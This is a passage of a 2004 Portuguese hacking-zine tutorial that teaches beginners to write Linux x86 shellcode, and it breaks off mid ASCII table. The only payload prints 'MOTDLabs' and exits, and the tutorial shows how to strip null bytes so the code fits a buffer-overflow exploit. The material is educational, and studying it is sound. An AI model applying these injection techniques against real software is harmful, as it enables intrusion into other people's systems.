@@ -1,0 +1,1835 @@
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[05]-=[Shellcode Sem Segredos Parte I]-=|IP_FIX|=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Shellcode Sem Segredos Parte I
+
+Desenvolvido por IP_FIX.
+ip_fix@motdlabs.com.br || everson3000@hotmail.com
+
+18/04/2004 
+Versão 1.0
+
+MOTDLabs:  http://www.motdlabs.org
+Lista:     http://lista.motdlabs.org
+
+Dedicação: Todos do grupo MOTD, em especial o Scythium Alhazred e vbKeyDel.
+           Narcotic pela ajuda em ASM e pelo empilha.c (vide motdlabs.org)
+	   slalon pela shell remota num SuSe onde pude testar meus codes... :P
+
+Thanks: Clube dos Mercenários: http://cdm.frontthescene.com.br
+	Front The Scene:       http://www.frontthescene.com.br
+	
+Observação: Os código apresentados aqui podem ser extraído com a phrack extract.
+
+Como vai galera? Sou eu mais uma vez para atormentar a vida de vocês, mas  creio
+que  dessa  vez  não  será  tanto. Irei  dissertar  sobre  a  escrita  básica de
+shellcodes, tentarei mostrar as facilidades e dificuldades dessa grande arte que
+exige muita paciência e dedicação.
+
+Resolvi escrever  esse tutorial  com o  intuito de  ajudar e  orientar os jovens
+fuçadores, Newbies, que estão começando nesse novo mundo mas sentem dificuldades
+de evoluírem devido ao escasso material de bom conteúdo em português. Reparo nos
+canais IRC que a busca  desse tipo de material é  grande, mas as fontes que  são
+passadas, geralmente  são: "Smashing  the stack  for fun  and profit", por Aleph
+One, e também:  "TUTORIAL BASICO DE  ESCRITA DE SHELLCODES",  por Nash Leon.  Na
+minha opinião, considero  esses uns dos  melhores artigos sobre  shellcodes, mas
+não quer dizer que são os únicos.  Quando iniciei minha busca, me depa- rei  com
+vários artigos que abrangem muito conceitos a  mais, e que ape- sar de serem  em
+inglês, eram de fácil entendimento.  Com base nesses materiais, irei  transpor a
+vocês que todo problema tem uma solução, que a chave para tudo é a persistência,
+criatividade e malícia.  Levei vários tropeços  até aprender o  "mínimo" e agora
+quero passar para todos vocês esse  mínimo que aprendi. Espero que façam  um bom
+aproveito desse  material e  que isso  desperte o  interesse de  todos, para uma
+maior discussão.
+
+Desde já agradeço o apoio  que o grupo MOTD tem  dado não só a mim,  mas a todos
+Newbies recém chegados ao underground que ficam em sua maioria, perdidos entre o
+"BEM" e  o "MAL",  quero dizer  que muitos  ao chegar,  acabam caindo  em canais
+lamers e defacers que faz com que  a mente dos novatos sejam usadas de  má forma
+para atitudes ilegais e desrespeitosas, denigrindo ainda mais a imagem "hacker".
+O MOTD por  só mostra a  realidade e os  caminhos para os  novatos, e com  isso,
+muitos têm se juntado a cena ética do hacking brasileiro, aprendendo e ajudando,
+isso faz todos ganharem. Obrigado galera!!! :) :P
+
+Como já falei, a escrita de shellcodes  não pode ser dita como "fácil", mas  ela
+também não é "difícil". Vejo que o maior problema da grande mai- oria é o  pouco
+conhecimento  da  linguagem  Assembly,   que  é  fundamental  para   o  completo
+entendimento. Quem mau viu  assembly na vida, vai  achar isso tudo uma  coisa de
+louco, de  outro planeta, mas quem já programa em assembly vai achar mais do que
+fácil. Entenderam o ponto que quis chegar? APRENDAM ASSEMBLY!!! Enquanto eu  não
+parei,  estudei  e  "pratiquei",  mal conseguia  entender  os  'xor'  da vida...
+Pratiquem muito Assembly!
+
+Conhecimentos  de  C,  Linux  e   principalmente  Asssembly  são  mais  do   que
+necessários, mas  somente o  básico. Uma  boa manipulção  com o  gcc e o gdb são
+muito bem-vindas! :)
+
+Antes gostaria  de informar  meu ambiente  de trabalho.  Vejo que alguns códigos
+podem ter comportamentos diferente em outros sistemas. Estou usando um Slackware
+9.1 sem qualquer modificação:
+
+root@motdlabs:/# uname -a
+Linux  motdlabs 2.4.22  #6 Tue  Sep 2  17:43:01 PDT  2003 i686  unknown unknown
+GNU/Linux
+
+root@motdlabs:/# gcc -v
+Reading specs from /usr/lib/gcc-lib/i486-slackware-linux/3.3.1/specs
+Configured with: ../gcc-3.3.1/configure --prefix=/usr --enable-shared
+--enable-threads=posix --enable-__cxa_atexit --disable-checking --with-gnu-ld
+--verbose --target=i486-slackware-linux --host=i486-slackware-linux
+Thread model: posix
+gcc version 3.3.1
+
+root@motdlabs:/# cat /proc/cpuinfo
+processor       : 0
+vendor_id       : GenuineIntel
+cpu family      : 6
+model           : 11
+model name      : Intel(R) Pentium(R) III CPU             1000MHz
+stepping        : 1
+cpu MHz         : 999.728
+cache size      : 256 KB
+fdiv_bug        : no
+hlt_bug         : no
+f00f_bug        : no
+coma_bug        : no
+fpu             : yes
+fpu_exception   : yes
+cpuid level     : 2
+wp              : yes
+flags           : fpu vme de pse tsc msr  pae mce cx8 sep mtrr pge mca cmov  pat
+                  pse36 mmx fxsr sse
+bogomips        : 1992.29
+
+root@motdlabs:/#
+
+O padrão full  da instalação do  slackware, inclui o  gcc 3.2.3, mas  com testes
+realizados com  o gcc  3.3.1 num  SuSe me  mostrou que  os código teriam que ser
+reescritos de outra forma. Então instalei o gcc 3.3.1 que vem acompanhado no CD2
+na pasta /extras. :)
+
+        Agora chega de enrolação!
+        Let's Rock! ;)
+
+
+Um bom começo para escrever um shellcode, é primeiro fazer um protótipo dele  em
+C. Com isso se tem uma melhor visão de como ele irá ficar em Assembly. Acompanhe
+abaixo  nosso primeiro  código, ele  irá apenas  imprimir a  string MOTDLabs  na
+tela.:
+
+<++> shellcode/cwrite.c
+/*
+ *  Protótipo de um shellcode em C.
+ *  Imprime a string "MOTDLabs" na tela.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o cwrite cwrite.c
+ */
+
+   #include <stdio.h>
+
+   int main() {
+
+   /* write(stdout,"MOTDLabs\n",strlen("MOTDLabs\n")); */
+   write(1,"MOTDLabs\n",10);
+
+   /* Sai limpo. */
+   exit(0);
+
+}
+<--> shellcode/cwrite.c
+
+ OBS: Sempre deixe seu código em C o mais simples possível.
+ 
+ Sem segredos esse programinha. Mas vamos analisar suas funções:
+ 
+Se  consegue  os  protótipos  das  funções  através  das  man  pages,  elas  são
+extremamente úteis, pois  é a documentação  ofical! Muitas dúvidas  minhas foram
+tiradas dela e certamente tirará as suas também!!! :)
+
+root@motdlabs:~/IP_FIX/shellcode# man 2 write
+
+ssize_t write(int fd, const void *buf, size_t count);
+
+int fd:  Será um  inteiro representando  um arquivo,  ou em  nosso caso, a saída
+padrão do monitor(STDOUT) que possui o valor de 1.
+
+const void *buf: Aqui colocamos nossa string que será armazenada no buffer.
+
+size_t count:  Colocaremos aqui  o número  total da  quantidade de caracteres de
+nossa string, incluindo o \n.
+
+ OBS: man 2 write  retornará um texto enorme,  mas só utilizarei o  que  irá nos
+ interessar.
+
+Super simples a função write(), mais simples ainda é a função exit().:
+
+void exit(int status);
+
+int status: Podemos usar EXIT_SUCESS (0) ou EXIT_FAILURE (1 ou -1).
+
+Usamos a função exit() para que se algo der errado, nosso programa termine  numa
+boa, por isso tem o  valor de 0 (EXIT_SUCESS), que  se der algo errado acima  do
+código o programa encerra limpo.
+
+       Bom, compile e execute e você verá que é muito simples mesmo.
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o cwrite cwrite.c
+root@motdlabs:~/IP_FIX/shellcode# ./cwrite
+MOTDLabs
+root@motdlabs:~/IP_FIX/shellcode#
+
+	Agora com base nesse protótipo em C, vamos remontá-lo em ASM.
+
+<++> shellcode/asmwrite.c
+/*
+ *  Protótipo de um shellcode em ASM.
+ *  Imprime a string "MOTDLabs" na tela.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o asmwrite asmwrite.c
+ */
+
+#include <stdio.h>
+
+main()
+{
+   __asm__(
+           "mov    $0x1, %ebx  \n" /* STDOUT da função write().                                                     */
+	   "push   $0x0A       \n" /* Aqui temos... (\n).                                                           */
+	   "push   $0x7362614C \n" /* ...nossa string... (sbaL).                                                    */
+           "push   $0x44544F4D \n" /* ...ao contrário. (DTOM).                                                      */
+	   "mov    %esp, %ecx  \n" /* Como toda nossa string se localiza no Stack, vamos jogá-la para o contador.   */
+	   "mov    $0xa, %edx  \n" /* Aqui está o tamanho da string: 0xa=10. Jogamos para o registradador de dados. */
+           "mov    $0x4, %eax  \n" /* Nossa querida system call de write().                                         */
+           "int    $0x80       \n" /* A melhor hora! Cai pro modo kernel e executa tudo acima!                      */
+	   "mov    $0x0, %ebx  \n" /* Jogamos 0(EXIT_SUCCESS) em %ebx.                                              */
+           "mov    $0x1, %eax  \n" /* Outra querida system call, da função exit() dessa vez.                        */
+           "int    $0x80       \n" /* Finalmente! Tudo é executado!                                                 */
+          );
+}
+<--> shellcode/asmwrite.c
+
+O que acharam?  Simples não? Bom,  pra alguns sim,  pra outros não.  Se você não
+entendeu,  estude mais  assembly, pegue  os links  no final  desse artigo  e se
+debulhe!!! Mas mesmo assim irei explicar o que se passa.
+
+Uma dúvida que geralmente trava os inciantes na linguagem assembly, é a passagem
+dos argumentos das funções aos registradore, muitos ficam perdidos sem saber pra
+qual passar aí vai  uma grande ajudar que  me abriu muito a  mente. Os problemas
+acabaram quando achei o "Linux System Call Table" em um site que mostrava toda a
+system call table que nós conhecemos em:
+
+root@motdlabs:/# cat /usr/include/asm/unistd.h
+
+E também  para qual  registrador cada  argumento vai,  veja o  exemplo da função
+exit() e write():
+
+ _____________________________________________________________________________________________
+|%eax|    Name    |           Source           |      %ebx    |  %ecx  |  %edx  | %esx | %edi |
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+| 1  |  sys_exit  | kernel/exit.c              |     int      |        |        |      |      |
+| 4  |  sys_write | arch/i386/kernel/process.c | unsigned int | char * | size_t |      |      |
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+	
+	Vamos analisar o que fizemos e comparar com nossa pequena tabela. 
+	Vamos ver a função write() e exit() novamente:
+
+ssize_t write(int fd, const void *buf, size_t count);
+              [%ebx], [    %ecx     ]  [    %edx   ]
+
+void exit(int status);
+          [  %ebx   ]
+
+Quais conclusões que chegamos? Vimos que o número da system call  sempre  deverá
+ser passada para %eax.  No caso de write(),  o inteiro sempre  deve  ser passado
+para %ebx,  a  string para %ecx   e o tamanho  para  %edx!!! Em  exit() o  mesmo
+raciocínio:  System call  em  %eax,  e o  int  para  %ebx. Compare tudo  isso no
+código novamente.  Você verá que agora ele faz  bem mais sentido. :)
+
+Com isso dá pra se chegar a conclusão que toda system call sempre irá para %eax;
+argumento 1 para  %ebx; argumento 2  para %ecx; argumento  3 para %edx;  e assim
+vai... Mas de qualquer colarei a tabela para acompanharmos com clareza.
+
+Bem, agora  que terminamos  nosso protótipo   em C  e em  ASM. Vamos  logo pegar
+todos  os  opcodes   (instruções  válidas)  em  hexadecimal   e  finalizar nosso
+shellcode.  Compile o   asmwrite.c normalmente,  execute-o  para ter certeza  de
+que funciona e vamos pegar os códigos hexadecimais no GDB.
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o asmwrite asmwrite.c
+root@motdlabs:~/IP_FIX/shellcode# ./asmwrite
+MOTDLabs
+root@motdlabs:~/IP_FIX/shellcode#
+
+Funciona perfeitamente. Agora precisamos  debugá-lo para pegarmos os  códigos em
+hexadecimal.
+
+root@motdlabs:~/IP_FIX/shellcode# gdb asmwrite
+GNU gdb 5.3
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-slackware-linux"...
+(gdb)
+
+O gdb  pra quem  não conhece,  é um  GNU Debugger.  Um excelente debugador livre
+muito completo. Não explicarei todos  os comando que ele possui,  mas explanarei
+os quais  iremos usar.  Voltando ao  asmwrite vamos  "disassembliar" o  objeto e
+conferir seu código:
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8048314 <main>:       push   %ebp
+0x8048315 <main+1>:     mov    %esp,%ebp
+0x8048317 <main+3>:     sub    $0x8,%esp
+0x804831a <main+6>:     and    $0xfffffff0,%esp
+0x804831d <main+9>:     mov    $0x0,%eax
+0x8048322 <main+14>:    sub    %eax,%esp
+0x8048324 <main+16>:    mov    $0x1,%ebx
+0x8048329 <main+21>:    push   $0xa
+0x804832b <main+23>:    push   $0x7362614c
+0x8048330 <main+28>:    push   $0x44544f4d
+0x8048335 <main+33>:    mov    %esp,%ecx
+0x8048337 <main+35>:    mov    $0xa,%edx
+0x804833c <main+40>:    mov    $0x4,%eax
+0x8048341 <main+45>:    int    $0x80
+0x8048343 <main+47>:    mov    $0x0,%ebx
+0x8048348 <main+52>:    mov    $0x1,%eax
+0x804834d <main+57>:    int    $0x80
+0x804834f <main+59>:    leave
+0x8048350 <main+60>:    ret
+0x8048351 <main+61>:    nop
+0x8048352 <main+62>:    nop
+0x8048353 <main+63>:    nop
+0x8048354 <main+64>:    nop
+0x8048355 <main+65>:    nop
+0x8048356 <main+66>:    nop
+0x8048357 <main+67>:    nop
+0x8048358 <main+68>:    nop
+0x8048359 <main+69>:    nop
+0x804835a <main+70>:    nop
+0x804835b <main+71>:    nop
+0x804835c <main+72>:    nop
+0x804835d <main+73>:    nop
+0x804835e <main+74>:    nop
+0x804835f <main+75>:    nop
+End of assembler dump.
+(gdb)
+
+	Hehehe, adoro isso! :)
+	
+Pra quem sabe um pouco de assembly,  sabe que o começo é o prelúdio,  prólogo ou
+processo incial, ele também reserva um espaço no stack e alinha a memória.  Eles
+serão úteis quando falarmos sobre  buffer overflows numa outra oportunidade  não
+distante. :P
+
+Maiores informações, vide os  links no fim do  arquivo sobre assembly. Lá  vocês
+encontrarão  as  respostas para  suas  perguntas! Voltando...  Repare  que nosso
+código começa  somente em  <main+16> e  a última  instrução começa em <main+57>.
+Então devemos pegar todos  os opcodes em hexadecimal  a partir de <main+16>  até
+<main+58>.
+
+Mas não  seria até  <main+57>??? Sim,  mas repare  que a  instrução "começa"  em
+<main+57> e prossegue até <main+58>, ou  seja, 1 antes da próxima instrução  que
+no caso seria <main+59>. Voltando a caça dos opcodes...
+
+O comando que usaremos é o x/xb, que irá nos retornar o código em hexa.:
+
+(gdb) x/xb main+16
+0x8048324 <main+16>:    0xbb
+(gdb)
+0x8048325 <main+17>:    0x01
+(gdb)
+0x8048326 <main+18>:    0x00
+(gdb)
+0x8048327 <main+19>:    0x00
+(gdb)
+0x8048328 <main+20>:    0x00
+(gdb)
+...
+...
+...
+0x804834a <main+54>:    0x00
+(gdb)
+0x804834b <main+55>:    0x00
+(gdb)
+0x804834c <main+56>:    0x00
+(gdb)
+0x804834d <main+57>:    0xcd
+(gdb)
+0x804834e <main+58>:    0x80
+(gdb)
+
+Dica: Depois do  x/xb main+16, aperte  e segure a  tecla ENTER, você  verá que o
+processo será bem mais rápido. :)
+
+	Ok, temos os códigos em hexadecimal e agora?
+	Agora nós iremos montá-lo para poder ser executado.:
+
+<++> shellcode/hexawrite.c
+/*
+ *  Shellcode pronto em hexadecimal.
+ *  Imprime a string "MOTDLabs" na tela.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o hexawrite hexawrite.c
+ */
+
+
+#include <stdio.h>
+
+char shellcode[] = "\xbb\x01\x00\x00\x00" /* mov    $0x1, %ebx  */
+		   "\x6a\x0a"	          /* push   $0x0A       */
+		   "\x68\x4c\x61\x62\x73" /* push   $0x7362614C */
+                   "\x68\x4d\x4f\x54\x44" /* push   $0x44544F4D */
+		   "\x89\xe1"	          /* mov    %esp, %ecx  */
+		   "\xba\x0a\x00\x00\x00" /* mov    $0xa, %edx  */
+                   "\xb8\x04\x00\x00\x00" /* mov    $0x4, %eax  */
+                   "\xcd\x80"	          /* int    $0x80       */
+		   "\xbb\x00\x00\x00\x00" /* mov    $0x0, %ebx  */
+                   "\xb8\x01\x00\x00\x00" /* mov    $0x1, %eax  */
+                   "\xcd\x80";            /* int    $0x80       */
+
+ main() {
+
+        /* Mostramos o tamanho para se ter um controle maior. */
+        printf("Tamanho do Shellcode: %d bytes.\n", sizeof(shellcode));
+
+	/* Criamos um ponteiro para uma função do tipo long. */
+        long (*executa) ();
+
+	/* Apontamos a função para o shellcode. */
+        executa = shellcode;
+
+	/* E aqui acontece a mágica! :) */
+        executa();
+}
+<--> shellcode/hexawrite.c
+
+	Pronto! Está pronto nosso shellcode.Vamos executá-lo! :D
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o hexawrite hexawrite.c
+hexawrite.c: In function `main':
+hexawrite.c:33: warning: assignment from incompatible pointer type
+root@motdlabs:~/IP_FIX/shellcode# ./hexawrite
+Tamanho do Shellcode: 44 bytes.
+MOTDLabs
+root@motdlabs:~/IP_FIX/shellcode#
+
+Pronto! Um simples shellcode que imprime uma string na tela com o tamanho de 44;
+(43+'\0').  Mostrar o  tamanho é  útil pra  saber se  caberá em  um buffer  numa
+situação de buffer overflow.
+
+O  correto  seria  ter  usado  a função  strlen()  para  calcular  o  tamanho do
+shellcode, mas, nesse caso, ele só contará até 2, pois ele encerrará a  contagem
+no primeiro null byte que encontrar(\x00), por isso o uso da função sizeof().
+
+Viram como é  simples fazer um  shellcode? Não é  nenhuma coisa de  outro mundo,
+basta ter  um mínimo  de conhecimento,  força de  vontade e  um pouco de malícia
+ajuda também. :)
+
+Mas como tudo na vida geralmente não é tão simples assim, vocês irão  se deparar
+com  um  pequeno  problema  caso  tentem  usar  esse  shellcode para explorar um
+buffer overflow.
+
+O problema  se encontra  nos "\x00"  que fazem  parte de  nosso shellcode,  pois
+quando jogarmos o shellcode dentro do buffer e apontarmos o endereço de  retorno
+para o  shellcode, ele  será executado  normalmente até  encontrar um  NULL byte
+(0x00), e a execução  do mesmo será interrompida  como se o código  tivesse sido
+finalizado, e isso não é nada legal!!! Provavelmente você verá uma mensagem como
+"Segmentation Fault" ou "Illegal Instruction".
+
+Calma companheiro! No mundo da  informática sempre tem um segundo  caminho, pode
+ser mais fácil ou difícil, mas tudo tem uma segunda saída. Como iremos  resolver
+então? É  até simples  a resposta,  muito simples,  vamos olhar  denovo o código
+asmwrite.c.
+
+Repare que manuseiamos muitos  0x0 (push $0x0, por  exemplo), mas não é  somente
+isso o problema, repare também que usamos os registradores de 32 bits (eax), que
+possuem uma parte alta  (ah) e a baixa  (al). Quando fazemos um  mov $0x4, %eax,
+por exemplo, não usamos todo o  espaço que o registrador oferece, o  que resulta
+em NULL byte já que sobra muito espaço.
+
+ __asm__(
+                 "mov    $0x1, %ebx  \n"
+		 "push   $0x0A       \n"
+		 "push   $0x7362614C \n"
+                 "push   $0x44544F4D \n"
+		 "mov    %esp, %ecx  \n"
+		 "mov    $0xa, %edx  \n"
+                 "mov    $0x4, %eax  \n"
+                 "int    $0x80       \n"
+		 "mov    $0x0, %ebx  \n"
+                 "mov    $0x1, %eax  \n"
+                 "int    $0x80       \n"
+                );
+
+Uma solução efetiva para isso, é simplesmente ao invés de jogarmos os 0x0 direto
+na pilha (push $0x0)  ou movermos 0x0 para  um registrador (mov $0x0,  %ebx) nós
+podemos zerar  o próprio  registrador com  xor (xor  %eax, %eax)  e jogar para a
+pilha (push %eax) assim não terá a necessidade de manusearmos os 0x0.
+
+A outra solução,  é também usarmos  a parte baixa  dos registradores (mov  $0xb,
+%dl), que faz com que não seje desperdiçado espaço já que estamos usando  apenas
+uma parte dele. A modificação é simples, e ficará da seguinte forma:
+
+<++> shellcode/asmwrite2.c
+/*
+ *  Protótipo de um shellcode em ASM.
+ *  Imprime a string "MOTDLabs" na tela.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o asmwrite2 asmwrite2.c
+ */
+
+#include <stdio.h>
+
+main()
+{
+        __asm__(
+		 "xor  %eax, %eax  \n" /* Sem isso nosso código em hexa não roda. :/                                      */
+	         "xor  %ebx, %ebx  \n" /* Precisamos zerar %ebx, para jogarmos o $0x1.                                    */
+		 "mov  $0x1, %bl   \n" /* STDOUT da função write().                                                       */
+		 "push $0x0A       \n" /* Aqui temos... (\n)                                                              */
+		 "push $0x7362614C \n" /* ...nossa string... (sbaL)                                                       */
+                 "push $0x44544F4D \n" /* ...ao contrário. (DTOM)                                                         */
+		 "mov  %esp, %ecx  \n" /* Jogamos nossa string para o contador. Como é muito grande, não usaremos %cl.    */
+		 "xor  %edx, %edx  \n" /* Precisamos zerar %edx, senão terá uma saída suja (imprimirá mais do esperado).  */
+		 "mov  $0xa, %dl   \n" /* Aqui está o tamanho da string: 0xa=10. Jogamos para o registradador de dados.   */
+                 "mov  $0x4, %al   \n" /* Nossa querida system call de write().                                           */
+                 "int  $0x80       \n" /* A melhor hora! Cai pro modo kernel e executa tudo acima!                        */
+                 "xor  %eax, %eax  \n" /* Sem isso nosso código em hexa não roda. :/                                      */
+		 "xor  %ebx, %ebx  \n" /* Como zeramos %ebx, não será necessário o mov $0x0, %ebx.                        */
+		 "mov  $0x1, %al   \n" /* Outra querida system call, da função exit() dessa vez.                          */
+                 "int  $0x80       \n" /* Finalmente! Tudo é executado!                                                   */
+                 );
+}
+<--> shellcode/asmwrite2.c
+
+Terminado! Captaram  as alterações?   Como perceberam,  foram poucas.  Uns xor's
+aqui,  uns %al  alí e  pronto! Será  que ele  ficou realmente  sem NULL's bytes?
+Vamos ver!!! :P
+
+Mas antes reparem que eu adicionei um "xor %eax, %eax" no início de cada  função
+ao código pois sem  eles não conseguiremos rodar  nosso programa somente com  os
+opcodes em hexadecimal.
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o asmwrite2 asmwrite2.c
+root@motdlabs:~/IP_FIX/shellcode# ./asmwrite2
+MOTDLabs
+root@motdlabs:~/IP_FIX/shellcode#
+
+	Compilamos e executamos sem problemas.
+        Vamos debugar:
+
+root@motdlabs:~/IP_FIX/shellcode# gdb asmwrite2
+GNU gdb 5.3
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-slackware-linux"...
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048314 <main>:       push   %ebp
+0x8048315 <main+1>:     mov    %esp,%ebp
+0x8048317 <main+3>:     sub    $0x8,%esp
+0x804831a <main+6>:     and    $0xfffffff0,%esp
+0x804831d <main+9>:     mov    $0x0,%eax
+0x8048322 <main+14>:    sub    %eax,%esp
+0x8048324 <main+16>:    xor    %eax,%eax
+0x8048326 <main+18>:    xor    %ebx,%ebx
+0x8048328 <main+20>:    mov    $0x1,%bl
+0x804832a <main+22>:    push   $0xa
+0x804832c <main+24>:    push   $0x7362614c
+0x8048331 <main+29>:    push   $0x44544f4d
+0x8048336 <main+34>:    mov    %esp,%ecx
+0x8048338 <main+36>:    xor    %edx,%edx
+0x804833a <main+38>:    mov    $0xa,%dl
+0x804833c <main+40>:    mov    $0x4,%al
+0x804833e <main+42>:    int    $0x80
+0x8048340 <main+44>:    xor    %eax,%eax
+0x8048342 <main+46>:    xor    %ebx,%ebx
+0x8048344 <main+48>:    mov    $0x1,%al
+0x8048346 <main+50>:    int    $0x80
+0x8048348 <main+52>:    leave
+0x8048349 <main+53>:    ret
+0x804834a <main+54>:    nop
+0x804834b <main+55>:    nop
+0x804834c <main+56>:    nop
+0x804834d <main+57>:    nop
+0x804834e <main+58>:    nop
+0x804834f <main+59>:    nop
+End of assembler dump.
+(gdb)
+
+Repare que agora o código começa em <main+16>, como antes, mas agora termina  em
+<main+51>. A retirada dos  null's bytes fez o  programa fica menor ainda.  Vamos
+capturar os opcodes novamente.:
+
+(gdb) x/xb main+16
+0x8048324 <main+16>:    0x31
+(gdb)
+0x8048325 <main+17>:    0xc0
+(gdb)
+0x8048326 <main+18>:    0x31
+(gdb)
+0x8048327 <main+19>:    0xdb
+(gdb)
+0x8048328 <main+20>:    0xb3
+(gdb)
+...
+...
+...
+0x8048343 <main+47>:    0xdb
+(gdb)
+0x8048344 <main+48>:    0xb0
+(gdb)
+0x8048345 <main+49>:    0x01
+(gdb)
+0x8048346 <main+50>:    0xcd
+(gdb)
+0x8048347 <main+51>:    0x80
+(gdb)
+
+Agora iremos montá-lo denovo, somente com os códigos em hexadecimal.:
+
+<++> shellcode/hexawrite2.c
+/*
+ *  Shellcode pronto em hexadecimal.
+ *  Imprime a string "MOTDLabs" na tela.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o hexawrite2 hexawrite2.c
+ */
+
+#include <stdio.h>
+
+char shellcode[] = "\x31\xc0"             /* xor    %eax, %eax  */
+		   "\x31\xdb"             /* xor    %ebx, %ebx  */
+		   "\xb3\x01"             /* mov    $0x1, %bl   */
+		   "\x6a\x0a"             /* push   $0x0A       */
+		   "\x68\x4c\x61\x62\x73" /* push   $0x7362614C */
+		   "\x68\x4d\x4f\x54\x44" /* push   $0x44544F4D */
+		   "\x89\xe1"             /* mov    %esp, %ecx  */
+		   "\x31\xd2"             /* xor    %edx, %edx  */
+		   "\xb2\x0a"             /* mov    $0xa, %dl   */
+		   "\xb0\x04"             /* mov    $0x4, %al   */
+		   "\xcd\x80"             /* int    $0x80       */
+		   "\x31\xc0"             /* xor    %eax, %eax  */
+		   "\x31\xdb"             /* xor    %ebx, %ebx  */
+                   "\xb0\x01"             /* mov    $0x1, %al   */
+		   "\xcd\x80";            /* int    $0x80       */
+
+ main() {
+
+        /* Mostramos o tamanho para se ter um controle maior. */
+        printf("Tamanho do Shellcode: %d bytes.\n", strlen(shellcode));
+
+	/* Criamos um ponteiro para uma função do tipo long. */
+        long (*executa) ();
+
+	/* Apontamos a função para o shellcode. */
+        executa = shellcode;
+
+	/* E aqui acontece a mágica! :) */
+        executa();
+}
+<--> shellcode/hexawrite2.c
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o hexawrite2 hexawrite2.c
+hexawrite2.c: In function `main':
+hexawrite2.c:36: warning: assignment from incompatible pointer type
+root@motdlabs:~/IP_FIX/shellcode# ./hexawrite2
+Tamanho do Shellcode: 36 bytes.
+MOTDLabs
+root@motdlabs:~/IP_FIX/shellcode#
+
+w00w00!!! Código bem menor, mais elegante e continua funcional!!!
+
+A retirada dos 0x00 fizeram uma grande diferença em nosso código. Perceberam  só
+como não tem muito segredo escrever um shellcode, é tudo questão de raciocínio e
+assembly! :P
+
+Para escrevermos na  tela foram empurrados  letras em hexadecimal  para o stack.
+Aqui está a tabela ascii para você acompanhar esse artigo com mais clareza.:
+
+root@motdlabs:~/IP_FIX/shellcode# man ascii
+
+       Oct   Dec   Hex   Char           Oct   Dec   Hex   Char
+       ------------------------------------------------------------
+       000   0     00    NUL '\0'       100   64    40    @
+       001   1     01    SOH            101   65    41    A
+       002   2     02    STX            102   66    42    B
+       003   3     03    ETX            103   67    43    C
+       004   4     04    EOT            104   68    44    D
+       005   5     05    ENQ            105   69    45    E
+       006   6     06    ACK            106   70    46    F
+       007   7     07    BEL '\a'       107   71    47    G
+       010   8     08    BS  '\b'       110   72    48    H
+       011   9     09    HT  '\t'       111   73    49    I
+       012   10    0A    LF  '\n'       112   74    4A    J
+       013   11    0B    VT  '\v'       113   75    4B    K
+       014   12    0C    FF  '\f'       114   76    4C    L
+       015   13    0D    CR  '\r'       115   77    4D    M
+       016   14    0E    SO             116   78    4E    N
+       017   15    0F    SI             117   79    4F    O
+       020   16    10    DLE            120   80    50    P
+       021   17    11    DC1            121   81    51    Q
+       022   18    12    DC2            122   82    52    R
+       023   19    13    DC3            123   83    53    S
+       024   20    14    DC4            124   84    54    T
+       025   21    15    NAK            125   85    55    U
+       026   22    16    SYN            126   86    56    V
+       027   23    17    ETB            127   87    57    W
+       030   24    18    CAN            130   88    58    X
+       031   25    19    EM             131   89    59    Y
+       032   26    1A    SUB            132   90    5A    Z
+       033   27    1B    ESC            133   91    5B    [
+       034   28    1C    FS             134   92    5C    \   '\\'
+       035   29    1D    GS             135   93    5D    ]
+       036   30    1E    RS             136   94    5E    ^
+       037   31    1F    US             137   95    5F    _
+       040   32    20    SPACE          140   96    60    `
+       041   33    21    !              141   97    61    a
+       042   34    22    "              142   98    62    b
+       043   35    23    #              143   99    63    c
+       044   36    24    $              144   100   64    d
+       045   37    25    %              145   101   65    e
+       046   38    26    &              146   102   66    f
+       047   39    27    '              147   103   67    g
+       050   40    28    (              150   104   68    h
+       051   41    29    )              151   105   69    i
+       052   42    2A    *              152   106   6A    j
+       053   43    2B    +              153   107   6B    k
+       054   44    2C    ,              154   108   6C    l
+       055   45    2D    -              155   109   6D    m
+       056   46    2E    .              156   110   6E    n
+       057   47    2F    /              157   111   6F    o
+       060   48    30    0              160   112   70    p
+       061   49    31    1              161   113   71    q
+       062   50    32    2              162   114   72    r
+       063   51    33    3              163   115   73    s
+       064   52    34    4              164   116   74    t
+       065   53    35    5              165   117   75    u
+       066   54    36    6              166   118   76    v
+       067   55    37    7              167   119   77    w
+       070   56    38    8              170   120   78    x
+       071   57    39    9              171   121   79    y
+       072   58    3A    :              172   122   7A    z
+       073   59    3B    ;              173   123   7B    {
+       074   60    3C    <              174   124   7C    |
+       075   61    3D    =              175   125   7D    }
